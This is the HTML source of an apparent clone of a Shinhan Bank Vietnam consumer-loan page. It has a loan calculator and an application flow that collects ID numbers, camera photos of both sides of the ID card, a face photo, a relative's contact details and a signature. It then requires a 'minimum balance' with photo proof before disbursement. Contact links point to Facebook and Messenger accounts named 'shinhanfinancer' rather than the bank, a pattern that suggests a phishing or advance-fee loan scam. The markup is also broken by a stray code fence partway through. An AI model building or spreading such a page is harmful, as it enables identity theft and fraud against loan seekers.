                            <li style="padding: 5px 30px;"><a href="pages/vi/card-referral.html" style="display: inline-block;font-weight: bold;text-decoration: none;background: linear-gradient(#f18b53, #f57a27, #e66c18);color: white;padding: 0px 25px;border-radius: 13px;box-shadow: 2px 3px 8px 1px #8c8c8c;">GIỚI THIỆU BẠN BÈ</a></li>
                        </ul>
                    </li>
                    <li><a href="pages/vi/chuyen-tien.html">Chuyển Tiền</a></li>
                </ul>
                <div class="bottom-nav">
                    <div class="li-w"><a href="pages/vi/chi-nhanh-gan-nhat.html" class="a-text">Điểm Giao Dịch, ATM & STM</a></div>
                    <div class="li-w"><a href="https://shinhancareer.com/" target="_blank" class="a-text">Tuyển Dụng</a></div>
                    <div class="li-w"><a href="https://m.me/shinhanfinancer?hash=AbbheNwiAth9Hcp7&source_id=8585216" class="a-text">Liên Hệ</a></div>
                    <div class="li-w"><a href="https://www.facebook.com/shinhanfinancer" class="a-text">Trung Tâm Hỗ Trợ</a></div>
                    <div class="search">
                        <input type="text" placeholder="Search here...">
                        <i><img src="assets/img/i_search2.png" alt=""></i>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <header>
        <div class="top-nav">
            <div class="container-w">
                <div class="row">
                    <div class="top-w">
                        <div class="hotline">
                            <span>Đường Dây Nóng</span>
                            <a href="tel:+19001577">1900 1577</a>
                        </div>
                        <a href="pages/vi/chi-nhanh-gan-nhat.html" class="link">Điểm Giao Dịch, ATM & STM</a>
                        <a href="https://shinhancareer.com/" target="_blank" class="link">Tuyển Dụng</a>
                        <a href="https://m.me/shinhanfinancer?hash=AbbheNwiAth9Hcp7&source_id=8585216" class="link">Liên Hệ</a>
                        <a href="https://www.facebook.com/shinhanfinancer" class="link">Trung Tâm Hỗ Trợ</a>
                        <div class="lang">
                            <a hreflang="en" href="/en/personal/consumer-loan.html" class="language"><span>en</span></a>
                        </div>
                        <div class="login">
                            <span class="t">Ngân Hàng Trực Tuyến</span>
                            <div class="btn-log">
                                <a href="https://online.shinhan.com.vn" target="_blank"><i><img src="assets/img/i_lock.png" alt=""></i><span>Đăng Nhập</span></a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="navigation">
            <div class="container-w">
                <div class="brand col-md-2">
                    <a href="index.html"><img src="assets/img/logo-01.svg" alt="Shinhan Bank" width="185px"></a>
                    <h1 class="hidden">Ngân hàng Shinhan</h1>
                </div>
                <div class="menu col-md-10">
                    <ul>
                        <li><a href="index.html">Trang chủ</a></li>
                        <li><a href="pages/vi/gioi-thieu.html">Giới Thiệu</a></li>
                        <li><a href="pages/vi/shinhan-pwm.html">Shinhan PWM</a></li>
                        <li><a href="pages/vi/ca-nhan.html">Cá nhân</a></li>
                        <li><a href="pages/vi/ho-kinh-doanh-sme.html">Hộ kinh doanh/SME</a></li>
                        <li><a href="pages/vi/doanh-nghiep.html">Doanh Nghiệp</a></li>
                        <li><a href="pages/vi/the.html">Thẻ</a></li>
                        <li><a href="pages/vi/chuyen-tien.html">Chuyển Tiền</a></li>
                    </ul>
                </div>
            </div>
            <div class="sub-nav">
                <div class="sub sub-2">
                    <div class="container-w">
                        <div class="row">
                            <div class="col-sm-3">
                                <div class="box">
                                    <h3 class="t-blue"><a href="pages/vi/gioi-thieu.html">Giới Thiệu về Shinhan</a></h3>
                                    <div class="list">
                                        <a href="pages/vi/gioi-thieu.html">Giới Thiệu</a>
                                        <a href="pages/vi/about-shinhan-way.html">Văn Hóa Shinhan</a>
                                        <a href="pages/vi/about-vision-mission.html">Tầm Nhìn & Sứ Mệnh</a>
                                        <a href="pages/vi/about-shinhan-financial-group.html">Giải Thưởng</a>
                                    </div>
                                </div>
                                <div class="box">
                                    <h3 class="t-blue"><a href="pages/vi/about-corporate-social-responsibility.html">Hoạt Động Xã Hội</a></h3>
                                </div>
                            </div>
                            <div class="col-sm-3">
                                <div class="box">
                                    <h3 class="t-blue"><a href="pages/vi/news-media-coverage.html">Tin Tức Và Thông Báo</a></h3>
                                    <div class="list">
                                        <a href="pages/vi/tin-tuc-hoat-dong.html">Tin tức hoạt động</a>
                                        <a href="pages/vi/press-release-2.html">Thông Cáo Báo Chí</a>
                                        <a href="pages/vi/thong-bao-xu-ly-tai-san-bao-dam.html">Thông báo xử lý tài sản bảo đảm</a>
                                    </div>
                                </div>
                                <div class="box">
                                    <h3 class="t-blue"><a href="https://shinhancareer.com/">Tuyển Dụng</a></h3>
                                </div>
                            </div>
                            <div class="col-sm-3">
                                <div class="box">
                                    <h3 class="t-blue"><a href="#">Công bố Thông tin</a></h3>
                                    <div class="list">
                                        <a href="pages/vi/financial-statement.html">Báo Cáo Tài Chính</a>
                                        <a href="pages/vi/disclosure-on-capital-adequacy-ratio.html">Công bố thông tin về Tỷ Lệ An Toàn Vốn</a>
                                        <a href="pages/vi/periodic-information-disclosure.html">Công bố thông tin phát hành giấy tờ có giá</a>
                                        <a href="pages/vi/business-review.html">Business Review</a>
                                    </div>
                                </div>
                                <div class="box">
                                    <h3 class="t-blue"><a href="https://m.me/shinhanfinancer?hash=AbbheNwiAth9Hcp7&source_id=8585216">Thông Tin Liên Hệ</a></h3>
                                </div>
                            </div>
                            <div class="col-sm-3">
                                <div class="box box-quick-access">
                                    <h3 class="t-blue">Truy Cập Nhanh</h3>
                                    <div class="list">
                                        <a href="public/documents/corporate_tariff_vi.pdf" target="_blank">> Biểu Phí Doanh Nghiệp</a>
                                        <a href="pages/vi/lai-suat-tien-gui.html">> Lãi Suất Tiền Gửi</a>
                                        <a href="pages/vi/mau-don.html">> Mẫu Đơn</a>
                                        <a href="pages/vi/lai-suat-vay.html">> Lãi Suất Vay</a>
                                        <a href="pages/vi/tham-chieu.html">> Tham Chiếu</a>
                                    </div>
                                </div>
                            </div>
                            <div class="banking-withus">
                                <h3 class="t">Giao Dịch Ngay</h3>
                                <div class="list">
                                    <a href="https://online.shinhan.com.vn/global-shinhan" target="_blank">Ngân Hàng Trực Tuyến</a>
                                    <a href="pages/vi/chi-nhanh-gan-nhat.html">Điểm Giao Dịch & ATM</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="sub sub-4">
                    <div class="container-w">
                        <div class="row">
                            <div class="col-sm-3">
                                <div class="box">
                                    <h3 class="t-blue"><a href="pages/vi/ca-nhan.html">Tài Khoản Tiền Gửi</a></h3>
                                    <div class="list">
                                        <a href="pages/vi/tai-khoan-thanh-toan-2.html">Tài Khoản Thanh Toán</a>
                                        <a href="pages/vi/tai-khoan-luong.html">Tài Khoản Lương</a>
                                        <a href="pages/vi/tai-khoan-tien-gui-co-ky-han-2.html">Tài Khoản Tiền Gửi Có Kỳ Hạn</a>
                                        <a href="pages/vi/tai-khoan-tien-gui-tich-luy.html">Tài Khoản Tiền Gửi Tích Lũy</a>
                                        <a href="pages/vi/tai-khoan-s-payroll-hoan-toan-mien-phi.html">Tài khoản S-Payroll</a>
                                        <a href="pages/vi/so-tai-khoan-may-man-2.html">Số tài khoản may mắn</a>
                                    </div>
                                </div>
                                <div class="box">
                                    <h3 class="t-blue"><a href="pages/vi/tin-dung-2.html">Vay Cá Nhân Trực Tuyến</a></h3>
                                    <div class="list">
                                        <a href="pages/vi/vay-mua-nha.html">Vay mua nhà</a>
                                        <a href="pages/vi/vay-mua-xe.html">Vay mua xe</a>
                                        <a href="pages/vi/vay-mua-xe-da-qua-su-dung.html">Vay mua xe đã qua sử dụng</a>
                                        <a href="pages/vi/vay-tieu-dung.html">Vay Tiêu Dùng</a>
                                        <a href="pages/vi/vay-tieu-dung-truc-tuyen.html">Vay tiêu dùng trực tuyến</a>
                                        <a href="pages/vi/chuong-trinh-hop-tac.html">Chương Trình Hợp Tác</a>
                                        <a href="pages/vi/vay-tieu-dung-bao-lanh.html">Vay Tiêu dùng Bảo lãnh</a>
                                        <a href="pages/vi/tra-no-khoan-vay-the-chap-bat-dong-san-tai-ngan-hang-khac.html">Trả nợ khoản vay thế chấp Bất động sản tại Ngân hàng khác</a>
                                    </div>
                                </div>
                            </div>
                            <div class="col-sm-3">
                                <div class="box">
                                    <h3 class="t-blue"><a href="#">Ngân Hàng Điện Tử</a></h3>
                                    <div class="list">
                                        <a href="pages/vi/internet-banking-4.html">Internet Banking</a>
                                        <a href="pages/vi/dich-vu-lien-ket-vi-dien-tu.html">Dịch vụ liên kết ví điện tử</a>
                                        <a href="pages/vi/dich-vu-sms-2.html">Dịch Vụ SMS</a>
                                        <a href="pages/vi/atm-2.html">ATM</a>
                                        <a href="pages/vi/stm.html">STM</a>
                                        <a href="pages/vi/duong-day-nong.html">Đường Dây Nóng</a>
                                        <a href="pages/vi/dich-vu-thanh-toan-truc-tuyen-voi-the-atm-noi-dia-shinhan.html">Thanh Toán Trực Tuyến Với Thẻ ATM Nội Địa Shinhan</a>
                                    </div>
                                </div>
                            </div>
                            <div class="col-sm-3">
                                <div class="box">
                                    <h3 class="t-blue"><a href="pages/vi/tops-club.html">Tops Club</a></h3>
                                    <h3 class="t-blue"><a href="pages/vi/shinhan-package.html">Shinhan Package</a></h3>
                                    <h3 class="t-blue"><a href="pages/vi/my-sol-package.html">My SOL Package</a></h3>
                                    <h3 class="t-blue"><a href="pages/vi/promotion.html">Chương Trình Khuyến Mãi</a></h3>
                                    <h3 class="t-blue"><a href="pages/vi/bao-hiem.html">Bảo Hiểm</a></h3>
                                    <h3 class="t-blue"><a href="pages/vi/shinhan-ois.html">Shinhan OIS</a></h3>
                                </div>
                            </div>
                            <div class="col-sm-3">
                                <div class="box box-quick-access">
                                    <h3 class="t-blue">Truy Cập Nhanh</h3>
                                    <div class="list">
                                        <a href="public/documents/corporate_tariff_vi.pdf" target="_blank">> Biểu Phí Doanh Nghiệp</a>
                                        <a href="pages/vi/lai-suat-tien-gui.html">> Lãi Suất Tiền Gửi</a>
                                        <a href="pages/vi/mau-don.html">> Mẫu Đơn</a>
                                        <a href="pages/vi/lai-suat-vay.html">> Lãi Suất Vay</a>
                                        <a href="pages/vi/tham-chieu.html">> Tham Chiếu</a>
                                    </div>
                                </div>
                            </div>
                            <div class="banking-withus">
                                <h3 class="t">Giao Dịch Ngay</h3>
                                <div class="list">
                                    <a href="https://online.shinhan.com.vn/global-shinhan" target="_blank">Ngân Hàng Trực Tuyến</a>
                                    <a href="pages/vi/chi-nhanh-gan-nhat.html">Điểm Giao Dịch & ATM</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </header>
    <div class="banner-top">
        <div class="container-w">
            <div class="text-w">
                <h2>Vay Tiêu Dùng</h2>
                <div class="bread">
                    <a href="index.html">Trang chủ</a>
                    <span>></span>
                    <a href="pages/vi/ca-nhan.html">Cá nhân</a>
                    <span>></span>
                    <span>Vay Tiêu Dùng</span>
                </div>
            </div>
        </div>
    </div>
    <div class="content-main">
        <div class="container">
            <img src="assets/img/logo-01.svg" alt="Shinhan Bank" class="logo">
            <h1>Tính Khoản Vay</h1>
            <div id="loanForm">
                <h3>Thông tin khoản vay</h3>
                <label for="loanType">Loại khoản vay <span class="tooltip">?<span class="tooltip-text">Chọn loại vay phù hợp với nhu cầu của bạn.</span></span></label>
                <select id="loanType" onchange="updateInterestRate()">
                    <option value="">Chọn loại khoản vay</option>
                    <option value="tinchap">Vay tín chấp</option>
                    <option value="digital_tinchap">Vay tín chấp số</option>
                    <option value="thechap_nha">Vay thế chấp mua nhà</option>
                    <option value="thechap_xe">Vay thế chấp mua xe</option>
                    <option value="thechap_xe_cu">Vay thế chấp xe đã qua sử dụng</option>
                    <option value="tai_nha">Vay tái tài trợ nhà</option>
                    <option value="dam_bao">Vay đảm bảo bán lẻ (SGI)</option>
                </select>
                <div id="loanTypeError" class="error"></div>
                <label for="amount">Số tiền vay (VND)</label>
                <input type="text" id="amount" oninput="formatNumber(this); validateAmount(this)" placeholder="Nhập số tiền vay">
                <div id="amountError" class="error"></div>
                <label for="term">Thời hạn vay (tháng)</label>
                <select id="term">
                    <option value="">Chọn thời hạn</option>
                    <option value="12">12 tháng</option>
                    <option value="24">24 tháng</option>
                    <option value="36">36 tháng</option>
                    <option value="48">48 tháng</option>
                    <option value="60">60 tháng</option>
                    <option value="72">72 tháng</option>
                    <option value="84">84 tháng</option>
                    <option value="96">96 tháng</option>
                </select>
                <div id="termError" class="error"></div>
                <label for="interest">Lãi suất (%/năm)</label>
                <input type="text" id="interest" readonly>
                <div id="interestError" class="error"></div>
                <label for="income">Thu nhập hàng tháng (VND)</label>
                <input type="text" id="income" oninput="formatNumber(this)" placeholder="Nhập thu nhập">
                <div id="incomeError" class="error"></div>
                <div id="loanCalcErrorSummary" class="error-summary"></div>
                <button onclick="calculateLoan()">Tính toán</button>
            </div>
            <div id="result"></div>
            <button onclick="openLoanCalcModal()">Tính lại khoản vay</button>
            <button onclick="openRegisterModal()">Đăng ký vay</button>
            <div class="modal" id="loanCalcModal">
                <div class="modal-content">
                    <span class="close-btn" onclick="closeLoanCalcModal()">×</span>
                    <h3>Tính Khoản Vay</h3>
                    <div id="loanForm">
                        <label for="loanType">Loại khoản vay</label>
                        <select id="loanType" onchange="updateInterestRate()">
                            <option value="">Chọn loại khoản vay</option>
                            <option value="tinchap">Vay tín chấp</option>
                            <option value="digital_tinchap">Vay tín chấp số</option>
                            <option value="thechap_nha">Vay thế chấp mua nhà</option>
                            <option value="thechap_xe">Vay thế chấp mua xe</option>
                            <option value="thechap_xe_cu">Vay thế chấp xe đã qua sử dụng</option>
                            <option value="tai_nha">Vay tái tài trợ nhà</option>
                            <option value="dam_bao">Vay đảm bảo bán lẻ (SGI)</option>
                        </select>
                        <div id="loanTypeError" class="error"></div>
                        <label for="amount">Số tiền vay (VND)</label>
                        <input type="text" id="amount" oninput="formatNumber(this); validateAmount(this)" placeholder="Nhập số tiền vay">
                        <div id="amountError" class="error"></div>
                        <label for="term">Thời hạn vay (tháng)</label>
                        <select id="term">
                            <option value="">Chọn thời hạn</option>
                            <option value="12">12 tháng</option>
                            <option value="24">24 tháng</option>
                            <option value="36">36 tháng</option>
                            <option value="48">48 tháng</option>
                            <option value="60">60 tháng</option>
                            <option value="72">72 tháng</option>
                            <option value="84">84 tháng</option>
                            <option value="96">96 tháng</option>
                        </select>
                        <div id="termError" class="error"></div>
                        <label for="interest">Lãi suất (%/năm)</label>
                        <input type="text" id="interest" readonly>
                        <div id="interestError" class="error"></div>
                        <label for="income">Thu nhập hàng tháng (VND)</label>
                        <input type="text" id="income" oninput="formatNumber(this)" placeholder="Nhập thu nhập">
                        <div id="incomeError" class="error"></div>
                        <div id="loanCalcErrorSummary" class="error-summary"></div>
                        <div class="form-actions">
                            <button onclick="calculateLoan()">Tính toán</button>
                            <button onclick="closeLoanCalcModal()">Hủy</button>
                        </div>
                    </div>
                </div>
            </div>
            <div class="modal" id="registerModal">
                <div class="modal-content">
                    <span class="close-btn" onclick="closeRegisterModal()">×</span>
                    <h3>Đăng ký vay</h3>
                    <div id="registerForm">
                        <label for="branch">Chi nhánh</label>
                        <select id="branch">
                            <option value="">Chọn chi nhánh</option>
                            <option value="hcm">TP. Hồ Chí Minh</option>
                            <option value="hn">Hà Nội</option>
                            <option value="dn">Đà Nẵng</option>
                        </select>
                        <div id="branchError" class="error"></div>
                        <label for="fullName">Họ và tên</label>
                        <input type="text" id="fullName" placeholder="Nhập họ và tên">
                        <div id="fullNameError" class="error"></div>
                        <label>Giới tính</label>
                        <div class="radio-group">
                            <label><input type="radio" name="gender" value="male"> Nam</label>
                            <label><input type="radio" name="gender" value="female"> Nữ</label>
                        </div>
                        <div id="genderError" class="error"></div>
                        <label for="birthDate">Ngày tháng năm sinh</label>
                        <input type="date" id="birthDate">
                        <div id="birthDateError" class="error"></div>
                        <label for="idNumber">Số CMND/CCCD</label>
                        <input type="text" id="idNumber" placeholder="Nhập số CMND/CCCD">
                        <div id="idNumberError" class="error"></div>
                        <label for="phone">Số điện thoại</label>
                        <input type="text" id="phone" placeholder="Nhập số điện thoại">
                        <div id="phoneError" class="error"></div>
                        <label for="hometown">Quê quán</label>
                        <input type="text" id="hometown" placeholder="Nhập quê quán">
                        <div id="hometownError" class="error"></div>
                        <label for="residence">Nơi thường trú</label>
                        <input type="text" id="residence" placeholder="Nhập nơi thường trú">
                        <div id="residenceError" class="error"></div>
                        <label for="income">Thu nhập hàng tháng (VND)</label>
                        <input type="text" id="income" oninput="formatNumber(this)" placeholder="Nhập thu nhập">
                        <div id="incomeError" class="error"></div>
                        <label for="job">Công việc hiện tại</label>
                        <input type="text" id="job" placeholder="Nhập công việc">
                        <div id="jobError" class="error"></div>
                        <label for="relativePhone">Số điện thoại người thân</label>
                        <input type="text" id="relativePhone" placeholder="Nhập số điện thoại">
                        <div id="relativePhoneError" class="error"></div>
                        <label for="relativeName">Tên người thân</label>
                        <input type="text" id="relativeName" placeholder="Nhập tên người thân">
                        <div id="relativeNameError" class="error"></div>
                        <label>Hình thức vay</label>
                        <div class="radio-group">
                            <label><input type="radio" name="loanForm" value="online">Online</label>
                            <label><input type="radio" name="loanForm" value="offline">Tại quầy</label>
                        </div>
                        <div id="loanFormError" class="error"></div>
                        <label>Đối tượng khách hàng</label>
                        <div class="radio-group">
                            <label><input type="radio" name="customerType" value="new">Khách hàng mới</label>
                            <label><input type="radio" name="customerType" value="existing">Khách hàng hiện tại</label>
                        </div>
                        <div id="customerTypeError" class="error"></div>
                        <label for="registerLoanType">Loại khoản vay</label>
                        <select id="registerLoanType">
                            <option value="">Chọn loại khoản vay</option>
                            <option value="tinchap">Vay tín chấp</option>
                            <option value="digital_tinchap">Vay tín chấp số</option>
                            <option value="thechap_nha">Vay thế chấp mua nhà</option>
                            <option value="thechap_xe">Vay thế chấp mua xe</option>
                            <option value="thechap_xe_cu">Vay thế chấp xe đã qua sử dụng</option>
                            <option value="tai_nha">Vay tái tài trợ nhà</option>
                            <option value="dam_bao">Vay đảm bảo bán lẻ (SGI)</option>
                        </select>
                        <div id="registerLoanTypeError" class="error"></div>
                        <label for="registerAmount">Số tiền vay (VND)</label>
                        <input type="text" id="registerAmount" oninput="formatNumber(this); validateAmount(this)" placeholder="Nhập số tiền vay">
                        <div id="registerAmountError" class="error"></div>
                        <label for="registerTerm">Thời hạn vay (tháng)</label>
                        <select id="registerTerm">
                            <option value="">Chọn thời hạn</option>
                            <option value="12">12 tháng</option>
                            <option value="24">24 tháng</option>
                            <option value="36">36 tháng</option>
                            <option value="48">48 tháng</option>
                            <option value="60">60 tháng</option>
                            <option value="72">72 tháng</option>
                            <option value="84">84 tháng</option>
                            <option value="96">96 tháng</option>
                        </select>
                        <div id="registerTermError" class="error"></div>
                        <div id="registerErrorSummary" class="error-summary"></div>
                        <div class="form-actions">
                            <button onclick="saveDraft()">Lưu bản nháp</button>
                            <button onclick="nextToVerify()">Tiếp tục</button>
                            <button onclick="closeRegisterModal()">Hủy</button>
                        </div>
                    </div>
                </div>
            </div>
            <div class="modal" id="verifyModal">
                <div class="modal-content">
                    <span class="close-btn" onclick="closeVerifyModal()">×</span>
                    <h3>Xác minh thông tin</h3>
                    <div id="verifyForm">
                        <div class="camera-section">
                            <label>Ảnh mặt trước CMND/CCCD</label>
                            <button onclick="startCamera('idPhotoFront')">Mở camera</button>
                            <input type="file" accept="image/*" onchange="handleFileUpload(event, 'idPhotoFront')">
                            <video id="cameraFeedidPhotoFront" style="display: none;"></video>
                            <button id="captureidPhotoFront" style="display: none;" onclick="capturePhoto('idPhotoFront')">Chụp</button>
                            <img id="previewidPhotoFront" class="preview" style="display: none;">
                            <div id="idPhotoFrontError" class="error"></div>
                        </div>
                        <div class="camera-section">
                            <label>Ảnh mặt sau CMND/CCCD</label>
                            <button onclick="startCamera('idPhotoBack')">Mở camera</button>
                            <input type="file" accept="image/*" onchange="handleFileUpload(event, 'idPhotoBack')">
                            <video id="cameraFeedidPhotoBack" style="display```html
none;"></video>
<button id="captureidPhotoBack" style="display: none;" onclick="capturePhoto('idPhotoBack')">Chụp</button>
<img id="previewidPhotoBack" class="preview" style="display: none;">
<div id="idPhotoBackError" class="error"></div>
</div>
<div class="camera-section">
    <label>Ảnh khuôn mặt</label>
    <button onclick="startCamera('facePhoto')">Mở camera</button>
    <input type="file" accept="image/*" onchange="handleFileUpload(event, 'facePhoto')">
    <video id="cameraFeedfacePhoto" style="display: none;"></video>
    <button id="capturefacePhoto" style="display: none;" onclick="capturePhoto('facePhoto')">Chụp</button>
    <img id="previewfacePhoto" class="preview" style="display: none;">
    <div id="facePhotoError" class="error"></div>
</div>
<div id="verifyErrorSummary" class="error-summary"></div>
<div class="form-actions">
    <button onclick="backToRegister()">Quay lại</button>
    <button onclick="submitRegistration()">Gửi đăng ký</button>
</div>
</div>
</div>
</div>
<div id="contract" style="display: none;">
<h3>Hợp đồng vay</h3>
<p><strong>Số hợp đồng:</strong> <span id="contractId"></span></p>
<p><strong>Ngày ký:</strong> <span id="contractDate"></span></p>
<p><strong>Họ và tên:</strong> <span id="contractFullName"></span></p>
<p><strong>Ngày sinh:</strong> <span id="contractBirthDate"></span></p>
<p><strong>Số CMND/CCCD:</strong> <span id="contractIdNumber"></span></p>
<p><strong>Số điện thoại:</strong> <span id="contractPhone"></span></p>
<p><strong>Quê quán:</strong> <span id="contractHometown"></span></p>
<p><strong>Nơi thường trú:</strong> <span id="contractResidence"></span></p>
<p><strong>Thu nhập:</strong> <span id="contractIncome"></span></p>
<p><strong>Công việc:</strong> <span id="contractJob"></span></p>
<p><strong>Số điện thoại người thân:</strong> <span id="contractRelativePhone"></span></p>
<p><strong>Tên người thân:</strong> <span id="contractRelativeName"></span></p>
<p><strong>Số tiền vay:</strong> <span id="contractLoanAmount"></span></p>
<p><strong>Thời hạn vay:</strong> <span id="contractLoanTerm"></span></p>
<p><strong>Số tiền trả hàng tháng:</strong> <span id="contractMonthlyPayment"></span></p>
<p><strong>Lãi suất:</strong> <span id="contractInterestRate"></span></p>
<div class="signature-pad">
    <canvas id="signaturePad" width="400" height="200"></canvas>
    <button onclick="clearSignature()">Xóa chữ ký</button>
</div>
<label><input type="checkbox" id="agreeContract"> Tôi đồng ý với các điều khoản hợp đồng</label>
<div id="agreeContractError" class="error"></div>
<button onclick="downloadContract()">Tải hợp đồng</button>
</div>
<div id="disbursement" style="display: none;">
<h3>Điều kiện giải ngân</h3>
<p><strong>Số CIF:</strong> <span id="disbursementCifNo"></span></p>
<p><strong>Số đồng ý giải ngân:</strong> <span id="disbursementConsentNo"></span></p>
<p><strong>Ngày giải ngân:</strong> <span id="disbursementDate"></span></p>
<p><strong>Họ và tên:</strong> <span id="disbursementFullName"></span></p>
<p><strong>Số điện thoại người thân:</strong> <span id="disbursementRelativePhone"></span></p>
<p><strong>Tên người thân:</strong> <span id="disbursementRelativeName"></span></p>
<p><strong>Số tiền vay:</strong> <span id="disbursementLoanAmount"></span></p>
<p><strong>Số dư tối thiểu:</strong> <span id="disbursementMinBalance"></span></p>
<p>Vui lòng duy trì số dư tối thiểu <span id="disbursementMinBalanceInline"></span> VND trong tài khoản để đảm bảo giải ngân.</p>
<div class="camera-section">
    <label>Ảnh xác nhận số dư tài khoản</label>
    <button onclick="startCamera('balancePhoto')">Mở camera</button>
    <input type="file" accept="image/*" onchange="handleFileUpload(event, 'balancePhoto')">
    <video id="cameraFeedbalancePhoto" style="display: none;"></video>
    <button id="capturebalancePhoto" style="display: none;" onclick="capturePhoto('balancePhoto')">Chụp</button>
    <img id="previewbalancePhoto" class="preview" style="display: none;">
    <div id="balancePhotoError" class="error"></div>
</div>
<button onclick="downloadDisbursement()">Tải điều kiện giải ngân</button>
</div>
<div class="back-to-top" id="backToTop">↑</div>
</div>
<footer>
<div class="main-ft">
    <div class="container-w">
        <div class="row">
            <div class="col-md-4">
                <div class="box">
                    <h3 class="t">Ngân hàng Shinhan</h3>
                    <div class="list">
                        <a href="pages/vi/gioi-thieu.html">Giới Thiệu</a>
                        <a href="pages/vi/about-shinhan-way.html">Văn Hóa Shinhan</a>
                        <a href="pages/vi/about-vision-mission.html">Tầm Nhìn & Sứ Mệnh</a>
                        <a href="pages/vi/about-shinhan-financial-group.html">Giải Thưởng</a>
                        <a href="pages/vi/about-corporate-social-responsibility.html">Hoạt Động Xã Hội</a>
                    </div>
                </div>
            </div>
            <div class="col-md-4">
                <div class="box">
                    <h3 class="t">Hỗ trợ</h3>
                    <div class="list">
                        <a href="pages/vi/chi-nhanh-gan-nhat.html">Điểm Giao Dịch, ATM & STM</a>
                        <a href="https://m.me/shinhanfinancer?hash=AbbheNwiAth9Hcp7&source_id=8585216">Liên Hệ</a>
                        <a href="https://www.facebook.com/shinhanfinancer">Trung Tâm Hỗ Trợ</a>
                        <a href="pages/vi/duong-day-nong.html">Đường Dây Nóng</a>
                    </div>
                </div>
            </div>
            <div class="col-md-4">
                <div class="box">
                    <h3 class="t">Truy Cập Nhanh</h3>
                    <div class="list">
                        <a href="public/documents/corporate_tariff_vi.pdf" target="_blank">Biểu Phí Doanh Nghiệp</a>
                        <a href="pages/vi/lai-suat-tien-gui.html">Lãi Suất Tiền Gửi</a>
                        <a href="pages/vi/mau-don.html">Mẫu Đơn</a>
                        <a href="pages/vi/lai-suat-vay.html">Lãi Suất Vay</a>
                        <a href="pages/vi/tham-chieu.html">Tham Chiếu</a>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<div class="bottom-ft">
    <div class="container-w">
        <div class="brand-ft">
            <img src="assets/img/shinhan_logo_2.svg" alt="Shinhan Bank" style="height: 26px;">
        </div>
        <div class="copyright">
            <p>Copyright © 2017 by SHINHAN Bank (Vietnam) Ltd,. All rights reserved.</p>
        </div>
        <div class="sub-menu-ft">
            <a href="pages/vi/chinh-sach-bao-mat.html">Chính Sách Bảo Mật</a>
            <a href="pages/vi/dieu-khoan-su-dung.html">Điều Khoản Sử Dụng</a>
            <a href="pages/vi/chinh-sach-lien-ket.html">Chính sách liên kết</a>
            <a href="pages/vi/sitemap-2.html">Sitemap</a>
            <a href="pages/vi/lai-suat-vay.html">Lãi Suất Vay</a>
            <a href="pages/vi/tham-chieu.html">Tham Chiếu</a>
        </div>
    </div>
</div>
</footer>
<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>
<script>
window.addEventListener('load', function() {
    setTimeout(function() {
        document.getElementById('vn4-the-languages_r3lPmIV5HM').outerHTML = '<a hreflang="en" href="/en/personal/consumer-loan.html" class="language"><span>en</span></a>';
    }, 10);
});
</script>
<script>
!function(window) {
    var $q = function(q, res) {
        if (document.querySelectorAll) {
            res = document.querySelectorAll(q);
        } else {
            var d = document,
                a = d.styleSheets[0] || d.createStyleSheet();
            a.addRule(q, 'f:b');
            for (var l = d.all, b = 0, c = [], f = l.length; b < f; b++)
                l[b].currentStyle.f && c.push(l[b]);
            a.removeRule(0);
            res = c;
        }
        return res;
    },
    addEventListener = function(evt, fn) {
        window.addEventListener ? this.addEventListener(evt, fn, false) : (window.attachEvent) ? this.attachEvent('on' + evt, fn) : this['on' + evt] = fn;
    },
    _has = function(obj, key) {
        return Object.prototype.hasOwnProperty.call(obj, key);
    };

    function loadImage(el, fn) {
        var img = new Image(),
            src = el.getAttribute('data-src');
        img.onload = function() {
            if (!!el.parent) {
                el.parent.replaceChild(img, el);
            } else {
                el.src = src;
            }
            fn ? fn() : null;
        };
        img.src = src;
    }

    function elementInViewport(el) {
        var rect = el.getBoundingClientRect();
        return (rect.top >= 0 && rect.left >= 0 && rect.top <= (window.innerHeight || document.documentElement.clientHeight));
    }

    var images = new Array(),
        query = $q('img.image-lazy-loading'),
        processScroll = function() {
            for (var i = 0; i < images.length; i++) {
                if (elementInViewport(images[i])) {
                    loadImage(images[i], function() {
                        images.splice(i, i);
                    });
                }
            }
        };

    for (var i = 0; i < query.length; i++) {
        images.push(query[i]);
    }

    setTimeout(function() {
        processScroll();
    }, 400);
    addEventListener('scroll', processScroll);
}(this);
</script>
<script>
function vn4subscribe_onpressenter(event) {
    var x = event.which || event.keyCode;
    if (x == 13) {
        vn4subscribe_qwertyuiop_os8s7MXr2dKDEYfOCjEb();
    }
}

function vn4subscribe_qwertyuiop_os8s7MXr2dKDEYfOCjEb() {
    event.preventDefault();
    event.stopPropagation();
    var email = document.getElementById('vn4subscribe_os8s7MXr2dKDEYfOCjEb').value;
    var re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    if (re.test(email)) {
        var xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                data = JSON.parse(this.response);
                if (data.success) {
                    message('Sign Up Success. We will update you with the latest news from Shinhan Bank.');
                    document.getElementById('vn4subscribe_os8s7MXr2dKDEYfOCjEb').value = '';
                }
            }
        };
        xhttp.open("POST", '/vn4-subscribe', true);
        xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        data = '_token=flBZzgVCzEBmPwoEyekJgpET4VkG6FCAU6WnPQta&email=' + email;
        xhttp.send(data);
    } else {
        message('Please enter the correct email format');
    }
    return false;
}
</script>
<a href="#popup-success" rel="leanmodal" id="btn-success" class="btn-success"></a>
<div class="popup-success" id="popup-success">
    <div class="btn-close modal_close">
        <img src="assets/img/i_close_2.png" alt="">
    </div>
    <div class="content">
        <h4 id="message_message">Message</h4>
    </div>
</div>
<!-- Chú thích: Nén JS bằng Webpack hoặc công cụ tương tự trong môi trường sản xuất -->
<script src="assets/js/main.min.js"></script>
<script src="assets/js/main.js"></script>
<script>
$('a[rel*=leanModal]').leanModal({ top: 200, closeButton: ".modal_close" });
